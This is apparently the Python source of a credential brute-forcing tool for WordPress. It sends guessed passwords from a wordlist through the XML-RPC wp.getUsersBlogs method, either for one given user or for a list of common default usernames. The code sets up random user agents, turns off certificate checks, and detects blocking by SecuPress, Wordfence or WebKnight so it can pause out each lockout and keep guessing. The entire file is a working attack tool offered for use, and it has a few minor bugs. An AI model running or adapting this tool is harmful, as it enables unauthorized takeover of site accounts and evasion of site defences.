import requests
import argparse
import sys
import time
from fake_useragent import UserAgent
from config import PLUS, WARNING, INFO, LESS, LINE, FORBI

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

#timer to wait securPress
def timer(length):
    start = time.time()
    running = True
    while running:
        if time.time() - start >= length:
            running = False
        else:
            sys.stdout.write(""+ str(length - (time.time() - start)) + " secondes...\r")
            sys.stdout.flush()
    print("\n")

def page_login(url):
    pages = ["wp-admin.php", "wp-login.php", "login.php", "admin"]
    for p in pages:
        res = requests.get(url.replace('xmlrpc.php', p), verify=False)
        if res.status_code == 404:
            pass
        else:
            return p

def method_allowed(url):
    list_method = '''<methodCall>
                    <methodName>system.listMethods</methodName>
                    <params></params>
                    </methodCall>'''
    req_method = requests.post(url, data=list_method, verify=False)
    if req_method.status_code == 405 or "Method Not Allowed" in req_method.text:
        print("{}Method Not Allowed !").format(WARNING)
        sys.exit()
    elif req_method.status_code == 403:
        print("{}ERROR 403 - Forbidden!".format(WARNING))
    elif "wp.getUsersBlogs" in req_method.text:
        return True

def main(url, wordlist, user, time_sleep, u_agent):
    if u_agent:
        user_agent = {'User-agent': u_agent}
    else:
        ua = UserAgent()
        user_agent = {'User-agent': ua.random} #for a user-agent random
    admin_page = page_login(url)
    if admin_page:
        print("{}admin page found: {}".format(PLUS, admin_page))
    #check if method allowed
    try_method = method_allowed(url)
    if try_method:
        print("{}wp.getUsersBlogs function found ! \n{}Bruteforce starting...".format(PLUS,INFO))
    #if username is know
    if user:
        print("{}Bruteforce with username: {}".format(INFO, user))
        with open(wordlist, "r+") as dico:
            dicos = dico.read().splitlines()
            for d in dicos:
                datas = '''<methodCall>
        		    <methodName>wp.getUsersBlogs</methodName>
        		    <params>
                    <param><value>{}</value></param>
                    <param><value>{}</value></param>
                    </params>
        		    </methodCall>'''.format(user, d)
                try:
                    req = requests.post(url, data=datas, verify=False)
                except:
                    pass
                if rs:
                    print(req.text)
                time.sleep(float(time_sleep))
                print(d)
                #print(req.text)
                if "Incorrect" in req.text or "incorrect" in req.text:
                    pass
                elif "SecuPress" in req.text or "bannie" in req.text or "WebKnight" in req.headers or \
                    "Generated by Wordfence" in req.text or "This response was generated by Wordfence" in req.text or \
                    "has been flagged for potential security violations" in req.text or "You have exceeded the login limit" in req.text:
                    print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
                    timer(300)
                else:
                    if admin_page:
                        res = requests.get(url.replace('xmlrpc.php', admin_page), verify=False)
                        if "SecuPress" in res.text or "bannie" in res.text or "WebKnight" in res.headers or \
                        "Generated by Wordfence" in res.text or "This response was generated by Wordfence" in res.text or \
                        "has been flagged for potential security violations" in req.text or "You have exceeded the login limit" in req.text:
                            print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
                            timer(300)
                        else:
                            print("{}password found: {}".format(PLUS, d))
                            sys.exit()
    else:
        print("{}default users test".format(INFO))
        users = ["admin", "manager", "both", "role1", "root", "role", "tomcat", "superuser","test","administrator"]
        for u in users:
            with open(wordlist, "r+") as dico:
                dicos = dico.read().splitlines()
                for d in dicos:
                    datas = '''<methodCall>
                        <methodName>wp.getUsersBlogs</methodName>
                        <params>
                        <param><value>{}</value></param>
                        <param><value>{}</value></param>
                        </params>
                        </methodCall>'''.format(u, d)
                    try:
                        req = requests.post(url, data=datas, verify=False)
                    except:
                        pass
                    time.sleep(float(time_sleep))
                    if rs:
                        print(req.text)
                    print("{}:{}".format(u, d))
                    if "Incorrect" in req.text or "incorrect" in req.text:
                        pass
                    elif "SecuPress" in req.text or "bannie" in req.text or "WebKnight" in req.headers or \
                    "Generated by Wordfence" in req.text or "This response was generated by Wordfence" in req.text or \
                    "has been flagged for potential security violations" in req.text or "You have exceeded the login limit" in req.text:
                        print("{} SecuPress actived, wait 5 min...\n".format(LESS))
                        timer(300)
                    else:
                        if admin_page:
                            res = requests.get(url.replace('xmlrpc.php', admin_page), verify=False)
                            if "SecuPress" in res.text or "bannie" in res.text or "WebKnight" in res.headers or \
                            "Generated by Wordfence" in res.text or "This response was generated by Wordfence" in res.text or \
                            "has been flagged for potential security violations" in req.text or "You have exceeded the login limit" in req.text:
                                print("{} SecuPress actived, wait 5 min...\n".format(LESS))
                                timer(300)
                            else:
                                print(res.text)
                                print("{}password found: {}".format(PLUS, d))
                                sys.exit()
                        

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", help="URL to scan [required]", dest='url')
    parser.add_argument("-w", help="Wordlist used for URL Fuzzing [required]", dest='wordlist')
    parser.add_argument("-s", help="timesleep if it's must fast", default=0, dest='time_sleep')
    parser.add_argument("--user", help="if you know the user", required=False, dest='user')
    parser.add_argument("-a", help="Choice user-agent", dest='user_agent', required=False)
    parser.add_argument("-rs", help="read source", dest='read_source', required=False, action='store_true')
    results = parser.parse_args()
                                     
    url = results.url
    wordlist = results.wordlist
    time_sleep = results.time_sleep
    user = results.user
    u_agent = results.user_agent
    rs = results.read_source

    main(url, wordlist, user, time_sleep, u_agent)
